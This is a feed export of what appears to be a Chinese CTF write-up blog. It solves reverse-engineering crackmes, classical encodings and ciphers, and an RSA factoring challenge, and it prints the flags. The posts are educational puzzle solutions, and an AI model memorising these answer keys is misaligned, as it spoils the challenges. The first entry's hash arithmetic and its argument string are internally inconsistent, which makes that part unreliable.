class="headerlink" title="程序分析"></a>程序分析</h3><p>这个程序需要三个命令行参数才能正常运行：</p><ol><li>第一个参数必须是整数<code>0xcafe</code>（即十进制的 51966）</li><li>第二个参数必须满足两个条件：<ul><li>模 5 不等于 3</li><li>模 17 等于 8</li></ul></li><li>第三个参数必须是字符串&#96;h4cky0</li></ol><p><strong>正确运行方法：</strong><br>.&#x2F;程序名 51966 25 h4cky0u</p><p>Brr wrrr grr<br>Get your key: c0ffee</p><p>OR<br><strong>直接算</strong><br>hash &#x3D; 51966 * 31337 + 8 * 11 + 8 - 1615810207 &#x3D; 1628468542 + 88 + 8 - 1615810207 &#x3D; 1628468638 - 1615810207 &#x3D; 12658431<br>转换为十六进制：<code>0xc0ffee</code></p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 直接给程序 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你会编汇编吗</title>
      <link href="/2025/06/db3be185141e.html"/>
      <url>/2025/06/db3be185141e.html</url>
      
        <content type="html"><![CDATA[<p>点开这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401550                 push    rbp</span><br><span class="line">.text:0000000000401551                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401554                 sub     rsp, 90h</span><br><span class="line">.text:000000000040155B                 call    __main</span><br><span class="line">.text:0000000000401560                 lea     rcx, Buffer     ; &quot;input your flag:&quot;</span><br><span class="line">.text:0000000000401567                 call    puts</span><br><span class="line">.text:000000000040156C                 lea     rax, [rbp+Str]</span><br><span class="line">.text:0000000000401570                 mov     rdx, rax</span><br><span class="line">.text:0000000000401573                 lea     rcx, Format     ; &quot;%s&quot;</span><br><span class="line">.text:000000000040157A                 call    scanf</span><br><span class="line">.text:000000000040157F                 lea     rax, [rbp+Str]</span><br><span class="line">.text:0000000000401583                 mov     rcx, rax        ; Str</span><br><span class="line">.text:0000000000401586                 call    strlen</span><br><span class="line">.text:000000000040158B                 cmp     rax, 23h ; &#x27;#&#x27;</span><br><span class="line">.text:000000000040158F                 jz      short loc_40159B</span><br><span class="line">.text:0000000000401591                 mov     eax, 0</span><br><span class="line">.text:0000000000401596                 jmp     loc_40162B</span><br><span class="line">.text:000000000040159B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040159B</span><br><span class="line">.text:000000000040159B loc_40159B:                             ; CODE XREF: main+3F↑j</span><br><span class="line">.text:000000000040159B                 mov     [rbp+var_4], 0</span><br><span class="line">.text:00000000004015A2</span><br><span class="line">.text:00000000004015A2 loc_4015A2:                             ; CODE XREF: main+C8↓j</span><br><span class="line">.text:00000000004015A2                 cmp     [rbp+var_4], 22h ; &#x27;&quot;&#x27;</span><br><span class="line">.text:00000000004015A6                 jg      short loc_40161A</span><br><span class="line">.text:00000000004015A8                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015AB                 cdqe</span><br><span class="line">.text:00000000004015AD                 movzx   eax, [rbp+rax+Str]</span><br><span class="line">.text:00000000004015B2                 xor     eax, 52h</span><br><span class="line">.text:00000000004015B5                 mov     edx, eax</span><br><span class="line">.text:00000000004015B7                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015BA                 cdqe</span><br><span class="line">.text:00000000004015BC                 mov     [rbp+rax+Str], dl</span><br><span class="line">.text:00000000004015C0                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015C3                 cdqe</span><br><span class="line">.text:00000000004015C5                 movzx   eax, [rbp+rax+Str]</span><br><span class="line">.text:00000000004015CA                 add     eax, 5</span><br><span class="line">.text:00000000004015CD                 mov     edx, eax</span><br><span class="line">.text:00000000004015CF                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015D2                 cdqe</span><br><span class="line">.text:00000000004015D4                 mov     [rbp+rax+Str], dl</span><br><span class="line">.text:00000000004015D8                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015DB                 cdqe</span><br><span class="line">.text:00000000004015DD                 movzx   eax, [rbp+rax+Str]</span><br><span class="line">.text:00000000004015E2                 movsx   eax, al</span><br><span class="line">.text:00000000004015E5                 mov     edx, [rbp+var_4]</span><br><span class="line">.text:00000000004015E8                 movsxd  rdx, edx</span><br><span class="line">.text:00000000004015EB                 lea     rcx, ds:0[rdx*4]</span><br><span class="line">.text:00000000004015F3                 lea     rdx, res</span><br><span class="line">.text:00000000004015FA                 mov     edx, [rcx+rdx]</span><br><span class="line">.text:00000000004015FD                 cmp     eax, edx</span><br><span class="line">.text:00000000004015FF                 jz      short loc_401614</span><br><span class="line">.text:0000000000401601                 lea     rcx, aWrong     ; &quot;Wrong!&quot;</span><br><span class="line">.text:0000000000401608                 call    puts</span><br><span class="line">.text:000000000040160D                 mov     eax, 0</span><br><span class="line">.text:0000000000401612                 jmp     short loc_40162B</span><br><span class="line">.text:0000000000401614 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401614</span><br><span class="line">.text:0000000000401614 loc_401614:                             ; CODE XREF: main+AF↑j</span><br><span class="line">.text:0000000000401614                 add     [rbp+var_4], 1</span><br><span class="line">.text:0000000000401618                 jmp     short loc_4015A2</span><br><span class="line">.text:000000000040161A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040161A</span><br><span class="line">.text:000000000040161A loc_40161A:                             ; CODE XREF: main+56↑j</span><br><span class="line">.text:000000000040161A                 lea     rcx, aGood      ; &quot;Good!&quot;</span><br><span class="line">.text:0000000000401621                 call    puts</span><br><span class="line">.text:0000000000401626                 mov     eax, 0</span><br><span class="line">.text:000000000040162B</span><br><span class="line">.text:000000000040162B loc_40162B:                             ; CODE XREF: main+46↑j</span><br><span class="line">.text:000000000040162B                                         ; main+C2↑j</span><br><span class="line">.text:000000000040162B                 add     rsp, 90h</span><br><span class="line">.text:0000000000401632                 pop     rbp</span><br><span class="line">.text:0000000000401633                 retn</span><br><span class="line">.text:0000000000401633 main            endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint = 0x21,0x6,0x6,0x16,0xb,0x19,0x2e,0x65,0x35,0x6a,0x6f,0x38,0x36,0x84,0x70,0x3b,0x39,0x65,0x38,0x35,0x84,0x6f,0x36,0x3c,0x6a,0x38,0x68,0x84,0x66,0x70,0x3b,0x38,0x6a,0x36,0x34,</span><br></pre></td></tr></table></figure><p><strong>分析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401550 push rbp </span><br><span class="line">.text:0000000000401551 mov rbp, rsp </span><br><span class="line">.text:0000000000401554 sub rsp, 90h </span><br><span class="line">.text:000000000040155B call __main</span><br><span class="line">#对应伪代码</span><br><span class="line">int main() &#123; </span><br><span class="line">// 保存旧的栈帧指针，设置新的栈帧，为局部变量分配空间 </span><br><span class="line">// push rbp; mov rbp, rsp; sub rsp, 90h </span><br><span class="line">// 调用初始化函数（可能是C标准库的初始化） </span><br><span class="line">__main();</span><br><span class="line"></span><br><span class="line">.text:0000000000401560 lea rcx, Buffer ;&quot;input your flag:&quot; </span><br><span class="line">.text:0000000000401567 call puts</span><br><span class="line">#对应伪代码</span><br><span class="line">puts(&quot;input your flag:&quot;);</span><br><span class="line"></span><br><span class="line">.text:000000000040156C lea rax, [rbp+Str] .text:0000000000401570 mov rdx, rax .text:0000000000401573 lea rcx, Format ; &quot;%s&quot; .text:000000000040157A call scanf</span><br><span class="line">#对应伪代码</span><br><span class="line">// 读取用户输入到局部变量Str中 </span><br><span class="line">char Str[/* 大小取决于栈空间分配 */]; </span><br><span class="line">scanf(&quot;%s&quot;, Str);</span><br><span class="line"></span><br><span class="line">.text:000000000040157F lea rax, [rbp+Str] .text:0000000000401583 mov rcx, rax ; Str .text:0000000000401586 call strlen .text:000000000040158B cmp rax, 23h ; &#x27;#&#x27; .text:000000000040158F jz short loc_40159B .text:0000000000401591 mov eax, 0 .text:0000000000401596 jmp loc_40162B</span><br><span class="line">#对应伪代码</span><br><span class="line">// 检查输入长度是否为35(0x23) </span><br><span class="line">if (strlen(Str) != 35) &#123; </span><br><span class="line">return 0; // 长度不符则退出 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:000000000040159B mov [rbp+var_4], 0 ; i = 0 .text:00000000004015A2 loc_4015A2: ; 循环开始 .text:00000000004015A2 cmp [rbp+var_4], 22h ; i &lt;= 34? </span><br><span class="line">.text:00000000004015A6 jg short loc_40161A .text:00000000004015A8 mov eax, [rbp+var_4] .text:00000000004015AB cdqe ; 符号扩展 .text:00000000004015AD movzx eax, [rbp+rax+Str] ; 取Str[i] </span><br><span class="line">.text:00000000004015B2 xor eax, 52h ; Str[i] ^= 0x52 #xor异或运算</span><br><span class="line">.text:00000000004015B5 mov edx, eax .text:00000000004015B7 mov eax, [rbp+var_4] .text:00000000004015BA cdqe .text:00000000004015BC mov [rbp+rax+Str], dl ; 写回Str[i] </span><br><span class="line">.text:00000000004015C0 mov eax, [rbp+var_4] .text:00000000004015C3 cdqe .text:00000000004015C5 movzx eax, [rbp+rax+Str] .text:00000000004015CA add eax, 5 ; Str[i] += 5 .text:00000000004015CD mov edx, eax .text:00000000004015CF mov eax, [rbp+var_4] .text:00000000004015D2 cdqe .text:00000000004015D4 mov [rbp+rax+Str], dl ; 写回Str[i]</span><br><span class="line">#对应伪代码</span><br><span class="line">// 初始化循环变量i=0 </span><br><span class="line">int i = 0; </span><br><span class="line">// 循环处理每个字符，直到i &gt; 34 (0x22) </span><br><span class="line">while (i &lt;= 34) &#123; </span><br><span class="line">// 对Str[i]进行变换：先异或0x52 </span><br><span class="line">Str[i] ^= 0x52; </span><br><span class="line">Str[i] += 5;// 再加上5</span><br><span class="line"></span><br><span class="line">.text:00000000004015D8 mov eax, [rbp+var_4] .text:00000000004015DB cdqe .text:00000000004015DD movzx eax, [rbp+rax+Str] .text:00000000004015E2 movsx eax, al ; 符号扩展 .text:00000000004015E5 mov edx, [rbp+var_4] .text:00000000004015E8 movsxd rdx, edx .text:00000000004015EB lea rcx, ds:0[rdx*4] ; hint[i*4]? </span><br><span class="line">.text:00000000004015F3 lea rdx, res ; 可能是hint数组基址 </span><br><span class="line">.text:00000000004015FA mov edx, [rcx+rdx] ; 取hint[i] </span><br><span class="line">.text:00000000004015FD cmp eax, edx ; 比较Str[i]与hint[i] </span><br><span class="line">.text:00000000004015FF jz short loc_401614 ; 相等则继续 </span><br><span class="line">.text:0000000000401601 lea rcx, aWrong ; &quot;Wrong!&quot; .text:0000000000401608 call puts .text:000000000040160D mov eax, 0 .text:0000000000401612 jmp short loc_40162B</span><br><span class="line">#对应伪代码</span><br><span class="line">// 检查变换后的Str[i]是否等于hint[i] </span><br><span class="line">if (Str[i] != hint[i]) &#123; </span><br><span class="line">puts(&quot;Wrong!&quot;); // 不相等则输出错误信息 </span><br><span class="line">return 0; // 并退出程序 </span><br><span class="line">&#125; </span><br><span class="line">i++; // 循环变量递增 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:000000000040161A loc_40161A: ; 循环结束后执行 .text:000000000040161A lea rcx, aGood ; &quot;Good!&quot; .text:0000000000401621 call puts .text:0000000000401626 mov eax, 0</span><br><span class="line">#对应伪代码</span><br><span class="line">// 所有字符验证通过，输出&quot;Good!&quot; </span><br><span class="line">puts(&quot;Good!&quot;); </span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">.text:000000000040162B loc_40162B: .text:000000000040162B add rsp, 90h ; 释放局部变量空间 </span><br><span class="line">.text:0000000000401632 pop rbp ; 恢复旧的栈帧指针 .text:0000000000401633 retn ; 返回</span><br><span class="line">#对应伪代码</span><br><span class="line">// 函数结束，栈帧恢复 </span><br><span class="line">&#125; // 对应main函数结束</span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">char Str[/* 长度动态 */]; </span><br><span class="line">printf(&quot;input your flag:&quot;); // puts(&quot;input your flag:&quot;) </span><br><span class="line">scanf(&quot;%s&quot;, Str); // 读取用户输入到 Str </span><br><span class="line">if (strlen(Str) != 0x23) &#123; // 0x23 = 35，检查输入长度是否为 35 </span><br><span class="line">printf(&quot;Wrong!&quot;); // 长度不对直接报错 </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br><span class="line">// 第一步：异或 0x52 </span><br><span class="line">Str[i] ^= 0x52; </span><br><span class="line">// 第二步：加 5 </span><br><span class="line">Str[i] += 5; </span><br><span class="line">// 第三步：与 hint 数组对比 </span><br><span class="line">if (Str[i] != hint[i]) &#123; </span><br><span class="line">printf(&quot;Wrong!&quot;); </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路：逆向推导-Flag"><a href="#解题思路：逆向推导-Flag" class="headerlink" title="解题思路：逆向推导 Flag"></a>解题思路：逆向推导 Flag</h3><p>已知 <code>hint</code> 数组，需<strong>反向推导原始输入 <code>Str</code></strong>（即 Flag ）。<br>逆向推导原始 <code>Str[i]</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Str[i] = (hint[i] - 5) ^ 0x52  </span><br></pre></td></tr></table></figure><p><strong>编写逆向计算脚本</strong><br>用 Python 反向推导每个 <code>Str[i]</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hint = [<span class="number">0x21</span>,<span class="number">0x6</span>,<span class="number">0x6</span>,<span class="number">0x16</span>,<span class="number">0xb</span>,<span class="number">0x19</span>,<span class="number">0x2e</span>,<span class="number">0x65</span>,<span class="number">0x35</span>,<span class="number">0x6a</span>,<span class="number">0x6f</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x84</span>,<span class="number">0x70</span>,<span class="number">0x3b</span>,<span class="number">0x39</span>,<span class="number">0x65</span>,<span class="number">0x38</span>,<span class="number">0x35</span>,<span class="number">0x84</span>,<span class="number">0x6f</span>,<span class="number">0x36</span>,<span class="number">0x3c</span>,<span class="number">0x6a</span>,<span class="number">0x38</span>,<span class="number">0x68</span>,<span class="number">0x84</span>,<span class="number">0x66</span>,<span class="number">0x70</span>,<span class="number">0x3b</span>,<span class="number">0x38</span>,<span class="number">0x6a</span>,<span class="number">0x36</span>,<span class="number">0x34</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> hint:</span><br><span class="line">    temp = (h - <span class="number">5</span>) ^ <span class="number">0x52</span> <span class="comment">#逆向计算:先减5,再异或 0x52</span></span><br><span class="line">    flag.append(<span class="built_in">chr</span>(temp))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))<span class="comment"># 拼接字符得到 Flag</span></span><br></pre></td></tr></table></figure><p>NSSCTF{2b78ac-9df2ab-8ce7a1-39da7c}</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ascii</title>
      <link href="/2025/06/4ae6af308ca1.html"/>
      <url>/2025/06/4ae6af308ca1.html</url>
      
        <content type="html"><![CDATA[<p>54 5a 43 46 6c 61 67 7b 48 65 6c 6c 6f 5f 41 53 43 49 49 7d<br><img src="/images/D49E689A-C316-4E38-8BC3-7F6155521A10.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> ASCII编码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Quoted-printable</title>
      <link href="/2025/06/898b6c6144d9.html"/>
      <url>/2025/06/898b6c6144d9.html</url>
      
        <content type="html"><![CDATA[<p>&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E4&#x3D;B9&#x3D;9F&#x3D;E5&#x3D;BE&#x3D;88&#x3D;E6&#x3D;A3&#x3D;92&#x3D;E5&#x3D;93&#x3D;A6<br>原理是没有等号就把英文、数字等原样输出，等号加两个十六进制数代表一个非 Ascii 码范围的字符（如汉字）或特殊字符。<br><img src="/images/Pastedimage20250601184509.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> Quoted-printable编码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tap tap</title>
      <link href="/2025/06/d953a328927b.html"/>
      <url>/2025/06/d953a328927b.html</url>
      
        <content type="html"><![CDATA[<p>小明最近在追《疑犯追凶》，在第二季结尾的时候出现了这么一张图片，他却没看懂啥意思，你能帮帮他吗 flag格式为TZCFlag{xxxx},xxxx全大写<br><img src="/images/tapcode.webp"></p><ul><li><code>44</code> 对应字母 <code>T</code> 。</li><li><code>42</code> 对应字母 <code>R</code> 。</li><li><code>11</code> 对应字母 <code>A</code> 。</li><li><code>24</code> 对应字母 <code>I</code> 。</li><li><code>33</code> 对应字母 <code>N</code> 。</li><li><code>43</code> 对应字母 <code>S</code> 。</li><li><code>44</code> 对应字母 <code>T</code> 。</li><li><code>33</code> 对应字母 <code>N</code> 。<br>TZCFlag{TRAINSTN}</li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 敲击码(Tap code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原理</title>
      <link href="/2025/06/55b5fee0b6cc.html"/>
      <url>/2025/06/55b5fee0b6cc.html</url>
      
        <content type="html"><![CDATA[<p>&#x3D;&#x3D;<strong>加密</strong>&#x3D;&#x3D;<br>当加密为两组时，把将要传递的信息中的字母交替排成上下两行。</p><p>再将下面一行字母排在上面一行的后边，从而形成一段密码。</p><p>例如：加密明文。<br><strong><em>ALL LIFE IS A GAME OF LUCK</em></strong></p><p>当加密为两组时，将句子从上往下交替写成两行，也就是第一 三 五等奇数个字母作为第一组，第二四六作为第二组。</p><p><strong><em>ALIESGMOLC</em></strong></p><p><strong><em>LLFIAAEFUK</em></strong></p><p>再将第一组放在第二组前</p><p><em><strong>ALIESGMOLCLLFIAAEFUK</strong></em></p><p>加密完成。</p><p>&#x3D;&#x3D;<strong>解 密</strong>&#x3D;&#x3D;<br>第一步将密文按组分开。当密文字母个数为奇数个时，第一组比第二组多一个。<br>第二步自上向下读出。 </p><p>举例：<br>密文：<em><strong>TMKECDYONOAEAHACUT</strong></em></p><p>密文字母个数为18，第一组9个字母，第二组9个字母。</p><p><em><strong>TMKECDYON</strong></em><br><em><strong>OAEAHACUT</strong></em></p><p>自上向下读出：<em><strong>TOMAKEEACHDAYCOUNT</strong></em></p><p>得明文：<em><strong>TO MAKE EACH DAY COUNT</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 换位密码 </category>
          
          <category> 栅栏密码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>篱笆墙的影子</title>
      <link href="/2025/06/d3e8b0c9d849.html"/>
      <url>/2025/06/d3e8b0c9d849.html</url>
      
        <content type="html"><![CDATA[<p>felhaagv{ewtehtehfilnakgw}</p><p>看这个felhaag，flag在里面很明显，最后一位是} 。<br>分成两组<br>f l a g { w e t h i n k w<br>e h a v e t h e f l a g }<br>这就是加密<br>flag{wethinkwehavetheflag}<br><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a>            [在线栅栏加解密]</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 换位密码 </category>
          
          <category> 栅栏密码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原理</title>
      <link href="/2025/06/54ed00852af2.html"/>
      <url>/2025/06/54ed00852af2.html</url>
      
        <content type="html"><![CDATA[<h3 id="编码规则"><a href="#编码规则" class="headerlink" title="编码规则"></a>编码规则</h3><p>将字母表排列成 5×5 的矩阵（C和K共用一格 ） ，如下：<br>|<img src="/images/Pastedimage20250603134130.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 敲击码(Tap code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>c,n,e</title>
      <link href="/2025/06/4c96d1aad14e.html"/>
      <url>/2025/06/4c96d1aad14e.html</url>
      
        <content type="html"><![CDATA[<p>c &#x3D; 566134289175001073338056659296498386641704313655869270504728356324933522811329068806508523532229682163525391220524802986785979422224911403071360548998101883993096018419857810663495564026562659363871989824162135535273717970285889221585901801835578256566036552604952749911282130835836581634840314211017046826426109774890418389574576128514071616464686335314358612894449871297012320880991577385456512998134643750537355527145843861005150574206728763965567156607610158050662833497593328881837388826744959143787862030176066778562928676173698618553745217799573433348833221151549888811871451808452955305602107063553259177528973779863154453333102822257682773411954333494475389886363107483562321532979964779714092494561759919711378961571336972685333275022586113138145007123147423870377012703192994633879942428704057951403358824692549839968488524015173505870905889600039037750913144895609595459004953371070240801671011997833228707676492818822464352241156584093362459311507045539329339058073049976087255850541570728786975634641284864343466456814506387776441995199436103111145990444660701184107235574238419914669387830626551319768539563036924648893943101966787768445626547186646731973307521638141189845168175085035920200073130311681615711143905321<br>n &#x3D; 966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533<br>e &#x3D; 65537</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from sympy import factorint</span><br><span class="line">from sympy import mod_inverse</span><br><span class="line">n = 966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533</span><br><span class="line"></span><br><span class="line"># 分解 n</span><br><span class="line">factors = factorint(n)</span><br><span class="line">p, q = factors.keys()</span><br><span class="line">phi_n = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = 566134289175001073338056659296498386641704313655869270504728356324933522811329068806508523532229682163525391220524802986785979422224911403071360548998101883993096018419857810663495564026562659363871989824162135535273717970285889221585901801835578256566036552604952749911282130835836581634840314211017046826426109774890418389574576128514071616464686335314358612894449871297012320880991577385456512998134643750537355527145843861005150574206728763965567156607610158050662833497593328881837388826744959143787862030176066778562928676173698618553745217799573433348833221151549888811871451808452955305602107063553259177528973779863154453333102822257682773411954333494475389886363107483562321532979964779714092494561759919711378961571336972685333275022586113138145007123147423870377012703192994633879942428704057951403358824692549839968488524015173505870905889600039037750913144895609595459004953371070240801671011997833228707676492818822464352241156584093362459311507045539329339058073049976087255850541570728786975634641284864343466456814506387776441995199436103111145990444660701184107235574238419914669387830626551319768539563036924648893943101966787768445626547186646731973307521638141189845168175085035920200073130311681615711143905321</span><br><span class="line">e = 65537</span><br><span class="line">d = mod_inverse(e, phi_n)</span><br><span class="line">m = pow(c, d, n) </span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">    m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;)</span><br><span class="line">    return m_bytes.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">flag = num_to_ascii(m)</span><br><span class="line">print(f&quot;flag = &#123;flag&#125;&quot;)</span><br></pre></td></tr></table></figure><p> flag&#x3D;TZCFlag{factor_is_so_easy}<br><img src="/images/Pastedimage20250603143451.png"></p><hr><p>n &#x3D; 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793<br>e &#x3D; 3  